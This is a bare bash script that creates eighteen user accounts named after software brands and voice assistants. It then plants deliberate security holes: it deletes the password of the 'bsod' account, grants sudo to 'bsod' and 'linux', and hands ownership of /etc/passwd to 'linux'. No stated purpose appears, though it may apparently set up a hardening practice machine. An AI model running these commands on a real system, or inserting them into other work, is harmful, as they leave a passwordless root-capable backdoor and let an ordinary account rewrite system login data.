#!/bin/bash

sudo useradd bsod
sudo useradd excel
sudo useradd powerpoint
sudo useradd linux
sudo useradd outlook
sudo useradd onenote
sudo useradd acrobat
sudo useradd photoshop
sudo useradd nortonantivirus
sudo useradd vlcplayer
sudo useradd googlechrome
sudo useradd steam
sudo useradd firefox
sudo useradd audacity
sudo useradd siri
sudo useradd alexa
sudo useradd garageband
sudo useradd keynote
sudo passwd -d bsod
sudo usermod -aG sudo bsod
sudo usermod -aG sudo linux
sudo chown linux /etc/passwd

